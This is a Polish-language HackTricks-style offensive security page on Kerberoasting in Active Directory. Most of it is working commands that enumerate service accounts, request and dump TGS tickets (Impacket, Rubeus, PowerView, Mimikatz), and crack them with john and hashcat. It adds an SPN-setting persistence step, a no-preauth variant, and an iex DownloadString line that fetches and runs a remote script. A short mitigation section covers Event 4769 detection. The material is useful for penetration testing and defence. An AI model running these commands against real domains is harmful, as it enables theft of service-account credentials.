# Kerberoast

{{#include ../../banners/hacktricks-training.md}}

## Kerberoast

Kerberoasting koncentruje się na pozyskiwaniu **biletów TGS**, szczególnie tych związanych z usługami działającymi pod **konto użytkownika** w **Active Directory (AD)**, z wyłączeniem **kont komputerów**. Szyfrowanie tych biletów wykorzystuje klucze pochodzące z **haseł użytkowników**, co umożliwia **łamanie poświadczeń offline**. Użycie konta użytkownika jako usługi wskazuje na niepustą właściwość **"ServicePrincipalName"**.

Aby wykonać **Kerberoasting**, niezbędne jest konto domenowe zdolne do żądania **biletów TGS**; jednak proces ten nie wymaga **specjalnych uprawnień**, co czyni go dostępnym dla każdego z **ważnymi poświadczeniami domenowymi**.

### Kluczowe punkty:

- **Kerberoasting** celuje w **bilety TGS** dla **usług kont użytkowników** w **AD**.
- Bilety szyfrowane kluczami z **haseł użytkowników** mogą być **łamane offline**.
- Usługa jest identyfikowana przez **ServicePrincipalName**, który nie jest pusty.
- **Nie są potrzebne specjalne uprawnienia**, tylko **ważne poświadczenia domenowe**.

### **Atak**

> [!WARNING]
> **Narzędzia Kerberoasting** zazwyczaj żądają **`szyfrowania RC4`** podczas przeprowadzania ataku i inicjowania żądań TGS-REQ. Dzieje się tak, ponieważ **RC4 jest** [**słabsze**](https://www.stigviewer.com/stig/windows_10/2017-04-28/finding/V-63795) i łatwiejsze do złamania offline przy użyciu narzędzi takich jak Hashcat niż inne algorytmy szyfrowania, takie jak AES-128 i AES-256.\
> Hashe RC4 (typ 23) zaczynają się od **`$krb5tgs$23$*`**, podczas gdy AES-256 (typ 18) zaczynają się od **`$krb5tgs$18$*`**.`

#### **Linux**
```bash
# Metasploit framework
msf> use auxiliary/gather/get_user_spns
# Impacket
GetUserSPNs.py -request -dc-ip <DC_IP> <DOMAIN.FULL>/<USERNAME> -outputfile hashes.kerberoast # Password will be prompted
GetUserSPNs.py -request -dc-ip <DC_IP> -hashes <LMHASH>:<NTHASH> <DOMAIN>/<USERNAME> -outputfile hashes.kerberoast
# kerberoast: https://github.com/skelsec/kerberoast
kerberoast ldap spn 'ldap+ntlm-password://<DOMAIN.FULL>\<USERNAME>:<PASSWORD>@<DC_IP>' -o kerberoastable # 1. Enumerate kerberoastable users
kerberoast spnroast 'kerberos+password://<DOMAIN.FULL>\<USERNAME>:<PASSWORD>@<DC_IP>' -t kerberoastable_spn_users.txt -o kerberoast.hashes # 2. Dump hashes
```
Narzędzia wielofunkcyjne, w tym zrzut użytkowników nadających się do kerberoast:
```bash
# ADenum: https://github.com/SecuProject/ADenum
adenum -d <DOMAIN.FULL> -ip <DC_IP> -u <USERNAME> -p <PASSWORD> -c
```
#### Windows

- **Wymień użytkowników podatnych na Kerberoast**
```powershell
# Get Kerberoastable users
setspn.exe -Q */* #This is a built-in binary. Focus on user accounts
Get-NetUser -SPN | select serviceprincipalname #Powerview
.\Rubeus.exe kerberoast /stats
```
- **Technika 1: Poproś o TGS i zrzutuj go z pamięci**
```powershell
#Get TGS in memory from a single user
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "ServicePrincipalName" #Example: MSSQLSvc/mgmt.domain.local

#Get TGSs for ALL kerberoastable accounts (PCs included, not really smart)
setspn.exe -T DOMAIN_NAME.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }

#List kerberos tickets in memory
klist

# Extract them from memory
Invoke-Mimikatz -Command '"kerberos::list /export"' #Export tickets to current folder

# Transform kirbi ticket to john
python2.7 kirbi2john.py sqldev.kirbi
# Transform john to hashcat
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat
```
- **Technika 2: Narzędzia automatyczne**
```bash
# Powerview: Get Kerberoast hash of a user
Request-SPNTicket -SPN "<SPN>" -Format Hashcat #Using PowerView Ex: MSSQLSvc/mgmt.domain.local
# Powerview: Get all Kerberoast hashes
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\kerberoast.csv -NoTypeInformation

# Rubeus
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
.\Rubeus.exe kerberoast /user:svc_mssql /outfile:hashes.kerberoast #Specific user
.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap #Get of admins

# Invoke-Kerberoast
iex (new-object Net.WebClient).DownloadString("https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1")
Invoke-Kerberoast -OutputFormat hashcat | % { $_.Hash } | Out-File -Encoding ASCII hashes.kerberoast
```
> [!WARNING]
> Gdy żądany jest TGS, generowane jest zdarzenie systemu Windows `4769 - Żądano biletu usługi Kerberos`.

### Łamanie
```bash
john --format=krb5tgs --wordlist=passwords_kerb.txt hashes.kerberoast
hashcat -m 13100 --force -a 0 hashes.kerberoast passwords_kerb.txt
./tgsrepcrack.py wordlist.txt 1-MSSQLSvc~sql01.medin.local~1433-MYDOMAIN.LOCAL.kirbi
```
### Persistence

Jeśli masz **wystarczające uprawnienia** nad użytkownikiem, możesz **sprawić, że będzie możliwe kerberoastowanie**:
```bash
Set-DomainObject -Identity <username> -Set @{serviceprincipalname='just/whateverUn1Que'} -verbose
```
Możesz znaleźć przydatne **narzędzia** do ataków **kerberoast** tutaj: [https://github.com/nidem/kerberoast](https://github.com/nidem/kerberoast)

Jeśli napotkasz ten **błąd** z systemu Linux: **`Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)`**, to z powodu lokalnego czasu, musisz zsynchronizować hosta z DC. Istnieje kilka opcji:

- `ntpdate <IP of DC>` - Przestarzałe od Ubuntu 16.04
- `rdate -n <IP of DC>`

### Mitigacja

Kerberoasting może być przeprowadzany z wysokim stopniem dyskrecji, jeśli jest wykonalny. Aby wykryć tę aktywność, należy zwrócić uwagę na **Security Event ID 4769**, który wskazuje, że żądano biletu Kerberos. Jednak z powodu wysokiej częstotliwości tego zdarzenia, należy zastosować konkretne filtry, aby wyizolować podejrzane działania:

- Nazwa usługi nie powinna być **krbtgt**, ponieważ jest to normalne żądanie.
- Nazwy usług kończące się na **$** powinny być wykluczone, aby uniknąć uwzględnienia kont maszynowych używanych do usług.
- Żądania z maszyn powinny być filtrowane przez wykluczenie nazw kont sformatowanych jako **machine@domain**.
- Należy brać pod uwagę tylko udane żądania biletów, identyfikowane przez kod błędu **'0x0'**.
- **Najważniejsze**, typ szyfrowania biletu powinien być **0x17**, który jest często używany w atakach Kerberoasting.
```bash
Get-WinEvent -FilterHashtable @{Logname='Security';ID=4769} -MaxEvents 1000 | ?{$_.Message.split("`n")[8] -ne 'krbtgt' -and $_.Message.split("`n")[8] -ne '*$' -and $_.Message.split("`n")[3] -notlike '*$@*' -and $_.Message.split("`n")[18] -like '*0x0*' -and $_.Message.split("`n")[17] -like "*0x17*"} | select ExpandProperty message
```
Aby zminimalizować ryzyko Kerberoasting:

- Upewnij się, że **hasła kont serwisowych są trudne do odgadnięcia**, zalecając długość większą niż **25 znaków**.
- Wykorzystaj **Zarządzane Konta Serwisowe**, które oferują korzyści takie jak **automatyczne zmiany haseł** i **delegowane zarządzanie nazwą główną usługi (SPN)**, co zwiększa bezpieczeństwo przed takimi atakami.

Wdrażając te środki, organizacje mogą znacznie zmniejszyć ryzyko związane z Kerberoastingiem.

## Kerberoast bez konta domenowego

W **wrześniu 2022** roku nowy sposób na wykorzystanie systemu został ujawniony przez badacza o imieniu Charlie Clark, udostępniony za pośrednictwem jego platformy [exploit.ph](https://exploit.ph/). Metoda ta pozwala na pozyskanie **Biletów Serwisowych (ST)** za pomocą żądania **KRB_AS_REQ**, które w sposób niezwykły nie wymaga kontroli nad żadnym kontem Active Directory. Zasadniczo, jeśli główny obiekt jest skonfigurowany w taki sposób, że nie wymaga wstępnej autoryzacji—scenariusz podobny do tego, co w dziedzinie cyberbezpieczeństwa nazywane jest atakiem **AS-REP Roasting**—ta cecha może być wykorzystana do manipulacji procesem żądania. Konkretnie, poprzez zmianę atrybutu **sname** w treści żądania, system jest oszukiwany do wydania **ST** zamiast standardowego zaszyfrowanego biletu przyznawania biletów (TGT).

Technika jest w pełni wyjaśniona w tym artykule: [Semperis blog post](https://www.semperis.com/blog/new-attack-paths-as-requested-sts/).

> [!WARNING]
> Musisz dostarczyć listę użytkowników, ponieważ nie mamy ważnego konta do zapytania LDAP przy użyciu tej techniki.

#### Linux

- [impacket/GetUserSPNs.py z PR #1413](https://github.com/fortra/impacket/pull/1413):
```bash
GetUserSPNs.py -no-preauth "NO_PREAUTH_USER" -usersfile "LIST_USERS" -dc-host "dc.domain.local" "domain.local"/
```
#### Windows

- [GhostPack/Rubeus z PR #139](https://github.com/GhostPack/Rubeus/pull/139):
```bash
Rubeus.exe kerberoast /outfile:kerberoastables.txt /domain:"domain.local" /dc:"dc.domain.local" /nopreauth:"NO_PREAUTH_USER" /spn:"TARGET_SERVICE"
```
## Odniesienia

- [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled)

{{#include ../../banners/hacktricks-training.md}}
